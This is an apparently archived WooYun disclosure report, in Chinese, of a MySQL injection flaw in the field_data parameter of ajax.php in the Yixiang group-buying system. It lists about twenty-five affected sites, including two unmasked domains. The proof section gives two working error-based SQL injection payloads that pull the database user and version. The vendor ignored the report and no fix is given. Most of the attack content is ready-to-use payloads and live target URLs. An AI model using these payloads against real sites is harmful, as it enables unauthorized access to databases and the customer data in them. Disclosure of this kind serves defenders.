wybug_title: 易想团购系统Mysql注入漏洞
wybug_corp: 福州华网信息科技有限公司
wybug_status: 未联系到厂商或者厂商积极忽略
wybug_detail:
漏洞详情 披露状态：   									2015-12-17：	积极联系厂商并且等待厂商认领中，细节不对外公开									2016-01-28：	厂商已经主动忽略漏洞，细节向公众公开  简要描述：  详细说明：  SQL注入点：
/ajax.php?act=check_field&field_name=user_name&field_data=1


案例：
http://**.**.**.**/ajax.php?act=check_field&field_name=user_name&field_data=1%27http://**.**.**.**//ajax.php?act=check_field&field_name=user_name&field_data=1%27http://**.**.**.**/tuan//ajax.php?act=check_field&field_name=user_name&field_data=1%27http://**.**.**.**//ajax.php?act=check_field&field_name=user_name&field_data=1%27http://**.**.**.**//ajax.php?act=check_field&field_name=user_name&field_data=1%27http://**.**.**.**/ajax.php?act=check_field&field_name=user_name&field_data=1%27http://**.**.**.**//ajax.php?act=check_field&field_name=user_name&field_data=1%27http://**.**.**.**/ajax.php?act=check_field&field_name=user_name&field_data=1%27http://**.**.**.**//ajax.php?act=check_field&field_name=user_name&field_data=1%27http://www.joinbuy.eu/ajax.php?act=check_field&field_name=user_name&field_data=1%27http://**.**.**.**/ajax.php?act=check_field&field_name=user_name&field_data=1%27http://**.**.**.**/ajax.php?act=check_field&field_name=user_name&field_data=1%27http://**.**.**.**//ajax.php?act=check_field&field_name=user_name&field_data=1%27http://**.**.**.**//ajax.php?act=check_field&field_name=user_name&field_data=1%27http://joinbuy.de//ajax.php?act=check_field&field_name=user_name&field_data=1%275http://**.**.**.**/tuan/ajax.php?act=check_field&field_name=user_name&field_data=1%27http://**.**.**.**/ajax.php?act=check_field&field_name=user_name&field_data=1%27http://**.**.**.**/ajax.php?act=check_field&field_name=user_name&field_data=1%27http://**.**.**.**/tuan/ajax.php?act=check_field&field_name=user_name&field_data=1%27http://**.**.**.**/tuan/ajax.php?act=check_field&field_name=user_name&field_data=1%27http://**.**.**.**:88/groupon//ajax.php?act=check_field&field_name=user_name&field_data=1%27http://**.**.**.**/mei/ajax.php?act=check_field&field_name=user_name&field_data=1%27http://**.**.**.**/ajax.php?act=check_field&field_name=user_name&field_data=1%27
   漏洞证明：  1#:
http://**.**.**.**/ajax.php?act=check_field&field_name=user_name&field_data=1' AND (SELECT 5151 FROM(SELECT COUNT(*),CONCAT(0x3a,(MID((IFNULL(CAST(CURRENT_USER() AS CHAR),0x20)),1,50)),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'x'='x


2#:
http://**.**.**.**/mei/ajax.php?act=check_field&field_name=user_name&field_data=1' AND (SELECT 5151 FROM(SELECT COUNT(*),CONCAT(0x3a,(MID((IFNULL(CAST(version() AS CHAR),0x20)),1,50)),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'x'='x


   修复方案：     版权声明：转载请注明来源 路人甲@乌云
wybug_reply: 漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝
